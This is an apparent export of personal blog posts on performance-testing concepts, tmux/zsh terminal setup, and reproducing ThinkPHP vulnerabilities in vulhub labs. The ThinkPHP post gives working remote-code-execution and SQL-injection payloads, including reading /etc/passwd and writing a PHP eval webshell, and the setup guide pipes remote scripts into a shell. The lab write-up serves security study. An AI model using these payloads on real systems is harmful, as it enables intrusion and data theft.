代码是否存在不合理的内存使用方式（代码用完了是不是有释放掉，还是一直占用着资源，监控内存是不是会出现内存溢出） 经验总结 执行顺序：负载|得到最大用户数 –&gt; 性能|得到各项指标 –&gt; 压力|查看服务器的稳定性 性能测试环境要求：需要搭建独立环境不可同自动化，功能测试环境混合，服务器配置和正式环境一致（硬件，数量可按集群比例划分，网络，架构参数） 性能测试中不能使用WiFi，不能使用VPN代理等桥接方式 性能测试的必要性研究，优先级制定（核心功能，用户访问量大的业务） 反复沟通确认性能指标，量化指标 参数指标TPS服务器每秒处理的事务数（综合处理能力，IO,CPU,network等） 吞吐量网络每秒能通过的事务（客户端和服务端传输通讯） RPS客户端（jmeter，loadrunner不局限于此）用户每秒请求率，例：并发数10，每人1s能发3个请求，rps=30 QPS服务器每秒查询率，在企业中如果没有严格区分，默认是把1个事务当做只查询了一次tps=qps–》1：1（但是实际的情况一般是一个事务对应多个查询即1个事务：N个查询） HPS每秒用户点击率（页面点击，较早的概念） RT响应时间，Response Time，是指从提交第一个请求到产生第一个响应所用时间，是用户最直观的感受，系统响应时间=网络（N1+N2+N3+N4）+服务处理(A1+A2+A3) 三大性能场景 执行顺序：负载|得到最大用户数 –&gt; 性能|得到各项指标 –&gt; 压力|查看服务器的稳定性 性能测试 通过工具,模拟多用户发起请求,获取**性能指标值**,用工具来模拟多个人的方式很多 进程:资源拥有者,资源消耗会比较大，如果电脑打开一个qq,系统后台就会生成一个进程以及对应的PID，代表软件loadrunner，性能测试标杆软件、c语言、国内破解(&lt;11）、12免费试用50限制用户数、更新极慢 线程:使用进程的资源，多线程技术（Thread），代表软件jmeter，建议v5.1.1+ 协程：一个底层调度单元，可以是一个函数，运行在线程之上代表python+locust，自行写py脚本 可靠性测试在给定一定的业务压力下，持续一段时间看系统是否稳定 最大并发*20% 容量测试 不同数据量级,数万条,百万条数据的操作读写不一样,因为测试环境数据一般不会很多,除非自己创造,所以在测试环境的速度和正式环境会有差异 在性能测试时,如果数据库的数据量级是不一致的,性能指标值,也可能存在差异生成的数据库数据量级百万级,测试环境几千几百条读写速度肯定会有差异，因此在做性能测试的时候数据库的量级要保持一致（可通过主从数据进行同步，或者批量造数据） 负载测试 逐步增加并发用户数找出最大拐点【区间】,适用于初步测试定位性能区间，可通过多次反复减小步长确定具体的值或较为精确的值 区间判断依据（tps计算：50tpsX60sX60minX8H=144W访问量） 请求报错 tps下降 响应时间变长长 压力测试 在**一定的压力下，持续较长**的时间，测试服务的稳定性，可靠性，一般是以小时为单位或者1-2天（因为现在互联网环境，速度很快）,在服务器出现不稳定的情况下再去做压力测试 一定的压力一般采用如下两种方案： 最大并发用户数*20%+相对较长时间 最大并发用户数*80%+相对短时间 测试流程性能测试目的 评估系统的处理能力：验证系统的处理能力是不是达到规划是的水平 发现系统中的性能瓶颈：是不是某个接口响应时间很长，tps很低，硬件是不是可以支持 验证系统稳定性和可靠性：长时间的测试会不会导致内存溢出 系统调优：重复执行性能测试，来验证系统调优是否取得预期结果 案例分析 需求支持50万并发/支持20万并发 系统用户数：就是我们系统用户数总数，包括活跃的和僵尸用户 在线用户数：就是登陆系统的用户，例如：其中有N个用户为在线，但是在线用户数并不一定会对服务器产生压力，比如有的挂机，session过期不算在线用户数 并发用户数：是对服务器产生压力的用户，例如：可能有10W人在线，但是只有20%用户对服务器产生了压力，也就是说这个接口并发用户数只有20%，以及需要拆分产品的需求，要求50W并发，本来系统就50W，但是并发数可能拆分下来就10%或者更少，要懂得分析 性能测试准备 需求分析 熟悉业务 明确性能测试目标(指标值) 了解软件功能、架构 制定测试计划,做好工作量评估(2-3倍，主要在环境搭建消耗时间，调优) 制定测试模型(编辑测试用例，性能场景) 首先必须要排除网络问题，比如准备千兆交换机，或者局域网的同一网段的千兆网卡 跑场景的时候，ping服务器，（ping ip -t）,确定网络，有没有丢包现象 先跑单个接口的性能测试场景（确定没有问题，或者能直接定位到具体问题的模块），再跑混合场景（多个接口混合） 搭建性能测试环境工具选型与准备(jmeter,loadrunner) 被测系统环境搭建（服务器，服务版本更新，数据库数据准备,数据量级） 网络配置 性能测试脚本开发选取协议（http，jdbc,websocket…）制作脚本调试脚本验证脚本 性能测试脚本执行试运行 场景执行（负载，性能，面向目标，混合） 结果分析与调优分析依据:结果图表分析思路:服务器硬件瓶颈&gt;网络瓶颈&gt;服务器σs瓶颈(参数配置、数据库、web服务器)&gt;应用瓶颈(sq语句、数据库设计、业务逻辑、算法)调优：修改脚本或场景 测试报告与结果跟踪性能测试报告性能测试问题跟踪 应用发展 最开始所有的代码都在一个工程下面，生成一个项目包，随着项目开发，代码越来越多，功能越来越多，导致的问题就来了，如果项目足够大，哪怕是再好的一台服务器也跑不动这个单体架构的项目 第二就是项目过大不好管理08年前，然后到了08年10年后就开始把项目和数据库（Oracle,sqlserver,access,mysql,postgrasql）、文件服务器（图片，资源，就像现在的七牛云,ftp,oss）、项目服务器(apache,tomcat,springboot,springcloud)分离、再后面就是集群（12-15年开始蔓延流行，主要是nignx），docker、微服务模块化（16 17年开始出现，只是大家技术没统一拆分方法，后面技术成熟了都用模块化的方式来拆分，所以就用了 springcloud，这样又导致不适用Tomcat了，因为太臃肿所以就用上了docker），中台 数据库开始主从同步备份，读写分离，分表分区，非关系型（momgodb：bson格式类似json格式的数据方式存储比较好操作18年左右流行起来的、memcache：缓存数据库13 14年就很流行，后面被readis替代，因为不能持久化（好像是可以配置的比较复杂），断电数据就没了 redis：缓存数据库，可以持久化，写入磁盘断电后可以再次读取 HBase：大数据分布式文件系统数据库18年左右） 时序数据库：influxdb Prometheus（根据时间记录数据，连接起来就像一条折现图，每一行的第一列都是时间戳，做监控平台的时候需要使用展示） 拆项目：前后端分离，中台（微服务衍生出来的，接口透传，封装接口，比如现在微服务的拆分导致模块越细，以前本来展示一个前台只需要调用一个后端接口现在可能需要调用三个，那么中台就可以做数据的封装，把三个接口的数据整理组装好一起返回给前端，14 15年就有中台概念，以前叫做数据总线）","categories":[{"name":"Performance","slug":"Performance","permalink":"https://www.adalucky.com/categories/Performance/"}],"tags":[{"name":"指标参数","slug":"指标参数","permalink":"https://www.adalucky.com/tags/%E6%8C%87%E6%A0%87%E5%8F%82%E6%95%B0/"},{"name":"性能测试流程","slug":"性能测试流程","permalink":"https://www.adalucky.com/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"}],"author":"Ada"},{"title":"Tmux","slug":"Other/终端美化","date":"2021-08-31T15:44:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/other/zhong-duan-mei-hua/","link":"","permalink":"https://www.adalucky.com/other/zhong-duan-mei-hua/","excerpt":"前几天在B站看到一个视频，感觉UP主的终端特别好看，尤其是分屏对工作效率的提升，本篇文章介绍一下在 Mac 下搭建终端环境 Tmux + iTerm2 + NeoVim + zsh 美化你的终端界面，提升效率","text":"前几天在B站看到一个视频，感觉UP主的终端特别好看，尤其是分屏对工作效率的提升，本篇文章介绍一下在 Mac 下搭建终端环境 Tmux + iTerm2 + NeoVim + zsh 美化你的终端界面，提升效率 参考资料Tmux使用手册 zsh+oh my zsh安装zsh和 oh my zsh Mac Big Sur升级后brew安装报错问题解决 curl&nbsp;443报错问题（亲测方案一有效） # 安装 zsh、查看版本、 设置为默认 brew install zsh zsh --version chsh -s /bin/zsh #安装 oh my zsh sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" iTerm2设置主题 主题下载地址：https://draculatheme.com/iterm 下载主题的zip包后解压到任意目录后，打开 iTerm2 –&gt; Preferences –&gt; Profiles –&gt; Clolors 找到 Color Presets 下来框，点击 import 导入 Dracula.itermcolors 然后重新选择 Dracula 设置字体Iterm2 里配置非 acsii 字体，否则对于 powerlevel10k 主题的特殊字体会显示不出来。 (Iterm2 -&gt; Preferences -&gt; Profiles -&gt; Text -&gt; Non-Ascii-Font 选择 nerd-font and restart Iterm2), 之后重启 Iterm2 生效 # https://github.com/ryanoasis/nerd-fonts#option-4-homebrew-fonts brew tap homebrew/cask-fonts brew cask install font-hack-nerd-font 安装 zplug 插件管理器# https://github.com/zplug/zplug curl -sL --proto-redir -all,https https://raw.githubusercontent.com/zplug/installer/master/installer.zsh | zsh 安装命令行工具brew install fzf # To install useful key bindings and fuzzy completion: $(brew --prefix)/opt/fzf/install brew install thefuck brew install autojump Tmux 简介tmux是一款优秀的终端复用软件，它比Screen更加强大，至于如何强大，网上有大量的文章讨论了这点，本文不再重复。tmux之所以受人们喜爱，主要得益于以下三 丝滑分屏（split），虽然iTem2也提供了横向和竖向分屏功能，但这种分屏功能非常拙劣，完全等同于屏幕新开一个窗口，新开的pane不会自动进入到当前目录，也没有记住当前登录状态。这意味着如果我ssh进入到远程服务器时，iTem2新开的pane中，我依然要重新走一遍ssh登录的老路（omg）。tmux就不会这样，tmux窗口中，新开的pane，默认进入到之前的路径，如果是ssh连接，登录状态也依旧保持着，如此一来，我就可以随意的增删pane，这种灵活性，好处不言而喻。 保护现场（attach），即使命令行的工作只进行到一半，关闭终端后还可以重新进入到操作现场，继续工作。对于ssh远程连接而言，即使网络不稳定也没有关系，掉线后重新连接，可以直奔现场，之前运行中的任务，依旧在跑，就好像从来没有离开过一样；特别是在远程服务器上运行耗时的任务，tmux可以帮你一直保持住会话。如此一来，你就可以随时随地放心地进行移动办公，只要你附近的计算机装有tmux（没有你也可以花几分钟装一个），你就能继续刚才的工作。 会话共享（适用于结对编程或远程教学），将 tmux 会话的地址分享给他人，这样他们就可以通过 SSH 接入该会话。如果你要给同事演示远程服务器的操作，他不必直勾勾地盯着你的屏幕，借助tmux，他完全可以进入到你的会话，然后静静地看着他桌面上你风骚的键盘走位，只要他愿意，甚至还可以录个屏。 安装安装成功后再终端输入 tmux 即可进入 tmux 服务 Mac 下的安装 # 先安装Homebrew，有则跳过 ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\" # 安装tmux brew install tmux 在Linux中安装 sudo apt-get install tmux 基本概念开始之前，我们先了解下基本概念： tmux采用C/S模型构建，输入tmux命令就相当于开启了一个服务器，此时默认将新建一个会话，然后会话中默认新建一个窗口，窗口中默认新建一个面板。会话、窗口、面板之间的联系如下： 一个tmux session（会话）可以包含多个window（窗口），窗口默认充满会话界面，因此这些窗口中可以运行相关性不大的任务。 一个window又可以包含多个pane（面板），窗口下的面板，都处于同一界面下，这些面板适合运行相关性高的任务，以便同时观察到它们的运行情况。 基础命令新建会话新建一个tmux session非常简单，语法为tmux new -s session-name，也可以简写为tmux，为了方便管理，建议指定会话名称，如下。 tmux # 新建一个无名称的会话 tmux new -s demo # 新建一个名称为demo的会话 断开会话会话中操作了一段时间，我希望断开会话同时下次还能接着用，怎么做？此时可以使用detach命令。 tmux detach # 断开当前会话，会话在后台运行 也许你觉得这个太麻烦了，是的，tmux的会话中，我们已经可以使用tmux快捷键了。使用快捷键组合Ctrl+b + d，三次按键就可以断开当前会话。 恢复会话断开会话后，想要接着上次留下的现场继续工作，就要使用到tmux的attach命令了，语法为tmux attach-session -t session-name，可简写为tmux a -t session-name 或 tmux a。通常我们使用如下两种方式之一即可： tmux a # 默认进入最新创建的一个会话 tmux a -t ada # 进入到名称为ada的会话 关闭会话会话的使命完成后，一定是要关闭的。我们可以使用tmux的kill命令，kill命令有kill-pane、kill-server、kill-session 和 kill-window共四种，其中kill-session的语法为tmux kill-session -t session-name。如下： tmux kill-session -t demo # 关闭demo会话 tmux kill-server # 关闭服务器，所有的会话都将关闭 查看所有的会话管理会话的第一步就是要查看所有的会话，我们可以使用如下命令： tmux list-session # 查看所有会话 tmux ls # 查看所有会话，提倡使用简写形式 tmux的所有指令，都包含同一个前缀，默认为Ctrl+b，输入完前缀过后，控制台激活，命令按键才能生效 如果刚好处于会话中怎么办？别担心，我们可以使用对应的tmux快捷键Ctrl+b + s，此时tmux将打开一个会话列表，按上下键(⬆︎⬇︎)或者鼠标滚轮，可选中目标会话，按左右键（⬅︎➜）可收起或展开会话的窗口，选中目标会话或窗口后，按回车键即可完成切换。 Tmux快捷指令关于快捷指令，首先要认识到的是：tmux的所有指令，都包含同一个前缀，默认为Ctrl+b，输入完前缀过后，控制台激活，命令按键才能生效。前面tmux会话相关的操作中，我们共用到了两个快捷键Ctrl+b + d、Ctrl+b + s，但这仅仅是冰山一角，欲窥tmux庞大的快捷键体系，请看下表。 系统指令 前缀 指令 描述 Ctrl+b ? 显示快捷键帮助文档 Ctrl+b d 断开当前会话 Ctrl+b D 选择要断开的会话 Ctrl+b Ctrl+z 挂起当前会话 Ctrl+b r 强制重载当前会话 Ctrl+b s 显示会话列表用于选择并切换 Ctrl+b : 进入命令行模式，此时可直接输入ls等命令 Ctrl+b [ 进入复制模式，按q退出 Ctrl+b ] 粘贴复制模式中复制的文本 Ctrl+b ~ 列出提示信息缓存 窗口（window）指令 前缀 指令 描述 Ctrl+b c 新建窗口 Ctrl+b &amp; 关闭当前窗口（关闭前需输入y or n确认） Ctrl+b 0~9 切换到指定窗口 Ctrl+b p 切换到上一窗口 Ctrl+b n 切换到下一窗口 Ctrl+b w 打开窗口列表，用于且切换窗口 Ctrl+b , 重命名当前窗口 Ctrl+b . 修改当前窗口编号（适用于窗口重新排序） Ctrl+b f 快速定位到窗口（输入关键字匹配窗口名称） 面板（pane）指令 前缀 指令 描述 Ctrl+b \" 当前面板上下一分为二，下侧新建面板 Ctrl+b % 当前面板左右一分为二，右侧新建面板 Ctrl+b x 关闭当前面板（关闭前需输入y or n确认） Ctrl+b z 最大化当前面板，再重复一次按键后恢复正常（v1.8版本新增） Ctrl+b ! 将当前面板移动到新的窗口打开（原窗口中存在两个及以上面板有效） Ctrl+b ; 切换到最后一次使用的面板 Ctrl+b q 显示面板编号，在编号消失前输入对应的数字可切换到相应的面板 Ctrl+b { 向前置换当前面板 Ctrl+b } 向后置换当前面板 Ctrl+b Ctrl+o 顺时针旋转当前窗口中的所有面板 Ctrl+b 方向键 移动光标切换面板 Ctrl+b o 选择下一面板 Ctrl+b 空格键 在自带的面板布局中循环切换 Ctrl+b Alt+方向键 以5个单元格为单位调整当前面板边缘 Ctrl+b Ctrl+方向键 以1个单元格为单位调整当前面板边缘（Mac下被系统快捷键覆盖） Ctrl+b t 显示时钟 tmux的丝滑分屏功能正是得益于以上系统、窗口、面板的快捷指令，只要你愿意，你就可以解除任意的快捷指令，然后绑上你喜欢的指令，当然这就涉及到它的可配置性了，请继续往下读。 自定义配置点击显/隐代码块(自定义配置) #-------------------------------额外配置---------------------- set -g prefix C-a # unbind C-b # C-b即Ctrl+b键，unbind意味着解除绑定 bind C-a send-prefix # 绑定Ctrl+a为新的指令前缀 # 从tmux v1.6版起，支持设置第二个指令前缀 set-option -g prefix2 ` # 设置一个不常用的`键作为指令前缀，按键更快些 # 绑定~/.tmux.conf配置文件生效快捷键为r bind r source-file ~/.tmux.conf \\; display-message \"Config reloaded..\" #新增面板绑定两个更常用的指令 -、| unbind '\"' bind - splitw -v -c '#{pane_current_path}' # 垂直方向新增面板，默认进入当前目录 unbind % bind | splitw -h -c '#{pane_current_path}' # 水平方向新增面板，默认进入当前目录 #开启鼠标支持 对于tmux v2.1(2015.10.28) #setw -g mode-mouse on # 支持鼠标选取文本等 #setw -g mouse-resize-pane on # 支持鼠标拖动调整面板的大小(通过拖动面板间的分割线) #setw -g mouse-select-pane on # 支持鼠标选中并切换面板 #setw -g mouse-select-window on # 支持鼠标选中并切换窗口(通过点击状态栏窗口名称) #tmux v2.1及以上的版本，仅需加入如下配置 set-option -g mouse on # 等同于以上4个指令的效果 # 切换面板的时候，需要按 ctlr+b 方向键，可以设置成 alt+方向键。配置文件里面的 M 表示 Meta，即 Alt 键。 bind -n M-Left select-pane -L bind -n M-Right select-pane -R bind -n M-Up select-pane -U bind -n M-Down select-pane -D #快速面板切换 # 绑定hjkl键为面板切换的上下左右键 bind -r k select-pane -U # 绑定k为↑ bind -r j select-pane -D # 绑定j为↓ bind -r h select-pane -L # 绑定h为← bind -r l select-pane -R # 绑定l为→ bind -r e lastp # 选择最后一个面板 bind -r ^e last # 选择最后一个窗口 bind -r ^u swapp -U # 与前一个面板交换位置 bind -r ^d swapp -D # 与后一个面板交换位置 #面板大小调整 # 绑定Ctrl+hjkl键为面板上下左右调整边缘的快捷指令 bind -r ^k resizep -U 10 # 绑定Ctrl+k为往↑调整面板边缘10个单元格 bind -r ^j resizep -D 10 # 绑定Ctrl+j为往↓调整面板边缘10个单元格 bind -r ^h resizep -L 10 # 绑定Ctrl+h为往←调整面板边缘10个单元格 bind -r ^l resizep -R 10 # 绑定Ctrl+l为往→调整面板边缘10个单元格 # 安装插件保持会话 set -g @plugin 'tmux-plugins/tpm' set -g @plugin 'tmux-plugins/tmux-sensible' set -g @plugin 'tmux-plugins/tmux-resurrect' set -g @plugin 'tmux-plugins/tmux-continuum' set -g @continuum-save-interval '240' #240分钟备份一次 set -g @continuum-restore 'on' # 启用自动恢复 set -g @resurrect-capture-pane-contents 'on' # 开启恢复面板内容功能 run '~/.tmux/plugins/tpm/tpm' # 初始化tmux插件管理器(保证这行在~/.tmux.conf的非常靠后的位置)","categories":[{"name":"Other","slug":"Other","permalink":"https://www.adalucky.com/categories/Other/"}],"tags":[{"name":"Tmux","slug":"Tmux","permalink":"https://www.adalucky.com/tags/Tmux/"},{"name":"NeoVim","slug":"NeoVim","permalink":"https://www.adalucky.com/tags/NeoVim/"}],"author":"Ada"},{"title":"thinkphp","slug":"Security/thinkphp","date":"2021-08-23T09:17:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/thinkphp/","link":"","permalink":"https://www.adalucky.com/security/thinkphp/","excerpt":"ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。 ThinkPHP可以支持 windows/unⅸx/ Linux等服务器环境,正式版需要PHP5.0以上版本支持,支持MySql、 PgSQL、 Sqlite多种数据库以及PDO扩展, ThinkPHP框架本身没有什么特别模块要求,具体的应用系统运行环境要求视开发所涉及的模块。","text":"ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。 ThinkPHP可以支持 windows/unⅸx/ Linux等服务器环境,正式版需要PHP5.0以上版本支持,支持MySql、 PgSQL、 Sqlite多种数据库以及PDO扩展, ThinkPHP框架本身没有什么特别模块要求,具体的应用系统运行环境要求视开发所涉及的模块。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 参考资料ThinkPHP系列漏洞之ThinkPHP 2.x 任意代码执行 Vulhub漏洞系列：ThinkPHP5 5.0.x5.1.x 远程代码执行漏洞 thinkphp 5.x全版本任意代码执行分析全记录 一次thinkphp渗透测试经历 ThinkPHP5.*版本发布安全更新 url在线编码解码 ThinkPHP5 5.0.23 Request类任意方法并构造利用链源码参考&nbsp; 站在大神宽阔的肩膀上复现菠菜漏洞 ThinkPHP 2.xThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由： $res = preg_replace('@(\\w+)'.$depr.'([^'.$depr.'\\/]+)@e', '$var[\\'\\\\1\\']=\"\\\\2\";', implode($depr,$paths)); 导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。 ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。 任意代码执行漏洞启动环境# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd thinkphp/2-rce # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 获取thinkphp版本故意让其报错，这样会返回系统的版本信息 http://www.security.ada:8080/index.php?a=1 获取phpinfo信息#直接访问 http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D 即可执行 phpinfo() http://www.security.ada:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D getshell# http://www.security.ada:8080/index.php?s=/index/index/name/${@print(eval($_POST[1]))}进行编码得到下面语句 http://www.security.ada:8080/index.php?s=/index/index/name/${@print%28eval%28$_POST[1]%29%29} 这里蚁剑连接的时候其实就是在连接的时候执行了一句话木马，因此连接的地址要用一句话木马的内容 ThinkPHP5 5.0.22/5.1.29ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。 远程代码执行漏洞启动环境运行ThinkPHP 5.0.20版本，环境启动后，访问http://your-ip:8080即可看到ThinkPHP默认启动页面。 # 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd /thinkphp/5-rce # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 获取thinkphp版本通过拼接参数s=任意一个不存在的值，故意让其报错，这样会返回系统的版本信息 http://www.security.ada:8080/?s=xxx 获取phpinfo信息# payload http://www.security.ada:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 远程执行shell将 phpinfo&amp;vars[1][]=-1 换为 shell_exec&amp;vars[1][]=whoami # whoami http://www.security.ada:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=whoami # shell_exec 执行 cat /etc/passwd http://www.security.ada:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=cat /etc/passwd # system 执行 cat /etc/passwd http://www.security.ada:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /etc/passwd #列出所有文件 http://www.security.ada:8080/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls -al 写入shell写入phpinfo#写入 shell.php phpinfo http://www.security.ada:8080/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E 写入一句话木马 eval()写入 eval 函数木马() 如果通过 phpinfo 中的 disable_functions 关键字查看 eval 函数被屏蔽了的话,或者 waf 拦截 需要换成 assert 函数进行fuzz # 写入一句话木马 &lt;?php @eval($_POST['hacker']); ?&gt; 进行编码 http://www.security.ada:8080/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=getshell.php&amp;vars[1][]=%3C?php%20@eval($_POST%5B'hacker'%5D);%20?%3E ThinkPHP5 5.0.23远程代码执行漏洞ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。 启动环境# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd /thinkphp/5.0.23-rce # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 获取thinkphp版本通过拼接参数s=任意一个不存在的值，故意让其报错，这样会返回系统的版本信息 http://www.security.ada:8080/?s=xxx 获取phpinfo信息 TODO 远程执行shell# url http://www.security.ada:8080/index.php?s=captcha # post参数 _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id ThinkPHP5 SQL ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露 影响版本：ThinkPHP &lt; 5.1.23 漏洞原理:传入的某参数在绑定编译指令的时候又没有安全处理,预编译的时候导致sαL异常报错。然而 thinkphp5默认开启 debug模式,在漏洞环境下构造错误的SαL语法会泄漏数据库账户和密码。 ThinkPHP5 SQL注入漏洞 &amp;&amp; PDO真/伪预处理分析 Thinkphp5X设计缺陷导致泄漏数据库账户密码 复现启动环境启动后，访问http://your-ip/index.php?ids[]=1&amp;ids[]=2，即可看到用户名被显示了出来，说明环境运行成功。 # 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd /thinkphp/in-sqlinjection # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v http://www.security.ada/index.php?ids[]=1&amp;ids[]=2 sql注入 信息泄露当然，这是一个比较鸡肋的SQL注入漏洞。但通过DEBUG页面，我们找到了数据库的账号、密码：这又属于一个敏感信息泄露漏洞。 http://www.security.ada/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://www.adalucky.com/tags/thinkphp/"}],"author":"Ada"},{"title":"SSRF","slug":"Security/SSRF","date":"2021-08-23T07:39:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/ssrf/","link":"","permalink":"https://www.adalucky.com/security/ssrf/","excerpt":"SSRF(Server-Side Request Forgery:服务器端请求伪造) 其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制 导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据 数据流:攻击者—–&gt;服务器—-&gt;目标地址","text":"SSRF(Server-Side Request Forgery:服务器端请求伪造) 其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制 导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据 数据流:攻击者—–&gt;服务器—-&gt;目标地址 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 